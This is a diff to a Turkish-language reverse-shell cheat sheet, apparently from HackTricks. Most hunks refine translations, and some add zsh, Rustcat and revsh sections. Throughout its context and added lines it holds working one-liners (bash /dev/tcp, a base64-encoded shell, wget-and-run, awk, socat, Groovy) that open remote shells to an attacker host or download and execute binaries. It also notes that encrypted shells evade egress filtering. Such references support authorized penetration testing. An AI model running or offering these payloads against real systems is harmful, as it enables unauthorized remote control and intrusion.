@@ -21,7 +21,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-Diğer shell'leri kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.
+Diğer shell'lerle kontrol etmeyi unutmayın: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh ve bash.
 
 ### Sembol güvenli shell
 ```bash
@@ -34,20 +34,20 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Shell açıklaması
 
-1. **`bash -i`**: Bu komutun kısmı etkileşimli (`-i`) Bash shell'ini başlatır.
-2. **`>&`**: Bu komutun kısmı, **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek için** kısayol notasyonudur.
+1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash shell başlatır.
+2. **`>&`**: Bu komutun bu kısmı **standart çıktıyı** (`stdout`) ve **standart hatayı** (`stderr`) **aynı hedefe yönlendirmek için** kısayol notasyonudur.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Bu, **belirtilen IP adresine ve porta bir TCP bağlantısını temsil eden** özel bir dosyadır.
 - **Çıktı ve hata akışlarını bu dosyaya yönlendirerek**, komut etkili bir şekilde etkileşimli shell oturumunun çıktısını saldırganın makinesine gönderir.
-4. **`0>&1`**: Bu komutun kısmı, **standart girişi (`stdin`) standart çıktının (`stdout`) aynı hedefine yönlendirir**.
+4. **`0>&1`**: Bu komutun bu kısmı **standart girişi (`stdin`) standart çıktının (`stdout`) aynı hedefine yönlendirir**.
 
-### Dosya oluştur ve çalıştır
+### Dosyada oluştur ve çalıştır
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Forward Shell
 
-Bir **Remote Code Execution (RCE)** zafiyeti ile bir Linux tabanlı web uygulamasıyla uğraşırken, ters bir shell elde etmek, iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Böyle kısıtlı ortamlarda, ele geçirilmiş sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) shell oluşturmak alternatif bir yaklaşım sunar.
+Linux tabanlı bir web uygulamasında **Remote Code Execution (RCE)** zafiyeti ile uğraşırken, bir reverse shell elde etmek iptables kuralları veya karmaşık paket filtreleme mekanizmaları gibi ağ savunmaları tarafından engellenebilir. Böyle kısıtlı ortamlarda, ele geçirilmiş sistemle daha etkili bir şekilde etkileşim kurmak için bir PTY (Pseudo Terminal) shell oluşturmak alternatif bir yaklaşım sunar.
 
 Bu amaç için önerilen bir araç [toboggan](https://github.com/n3rada/toboggan.git) olup, hedef ortamla etkileşimi basitleştirir.
 
@@ -86,10 +86,10 @@ Başka bir olasılık, `IppSec` ileri shell uygulamasını kullanmaktır [**http
 Sadece şunları değiştirmeniz gerekiyor:
 
 - Zayıf hedefin URL'si
-- Yükleminizin ön eki ve son eki (varsa)
-- Yüklemin nasıl gönderileceği (başlıklar? veri? ek bilgi?)
+- Yükünüzün ön eki ve son eki (varsa)
+- Yükün gönderilme şekli (başlıklar? veri? ek bilgi?)
 
-Sonra, sadece **komutlar gönderebilir** veya hatta **tam bir PTY almak için `upgrade` komutunu kullanabilirsiniz** (boruların yaklaşık 1.3 saniyelik bir gecikme ile okunduğunu ve yazıldığını unutmayın).
+Sonra, sadece **komutlar gönderebilir** veya hatta **tam bir PTY almak için `upgrade` komutunu** kullanabilirsiniz (boruların yaklaşık 1.3 saniyelik bir gecikme ile okunduğunu ve yazıldığını unutmayın).
 
 ## Netcat
 ```bash
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (yerleşik TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – modern netcat benzeri dinleyici, Rust ile yazılmıştır (2024'ten beri Kali'de paketlenmiştir).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Özellikler:
+- Şifreli taşıma için isteğe bağlı `--ssl` bayrağı (TLS 1.3)
+- Kurban üzerinde herhangi bir ikili dosya başlatmak için `-s` (örn. `/bin/sh`, `python3`)
+- Tam etkileşimli PTY'ye otomatik olarak yükseltmek için `--up`
+
+## revsh (şifreli & pivot için hazır)
+
+`revsh`, **şifreli Diffie-Hellman tüneli** üzerinden tam TTY sağlayan küçük bir C istemci/sunucusudur ve isteğe bağlı olarak ters VPN benzeri pivotlama için bir **TUN/TAP** arayüzü ekleyebilir.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Faydalı bayraklar:
+- `-b` : tersine yerine bind-shell
+- `-p socks5://127.0.0.1:9050` : TOR/HTTP/SOCKS üzerinden proxy
+- `-t` : bir TUN arayüzü oluştur (ters VPN)
+
+Tüm oturum şifreli ve çoklu olduğundan, genellikle düz metin `/dev/tcp` shell'ini öldürecek basit çıkış filtrelemesini atlar.
+
 ## OpenSSL
 
 Saldırgan (Kali)
@@ -253,7 +295,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Parmak
+## Finger
 
 **Saldırgan**
 ```bash
@@ -296,7 +338,7 @@ Bu, sisteminize 6001 numaralı portta bağlanmaya çalışacaktır:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Ters kabuğu yakalamak için şunu kullanabilirsiniz (port 6001'de dinleyecek):
+Ters shell'i yakalamak için (port 6001'de dinleyecek) şunu kullanabilirsiniz:
 ```bash
 # Authorize host
 xhost +targetip
@@ -305,7 +347,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOT: Java ters kabuk Groovy için de çalışır
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOT: Java reverse shell Groovy için de çalışır
 ```bash
 String host="localhost";
 int port=8044;
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
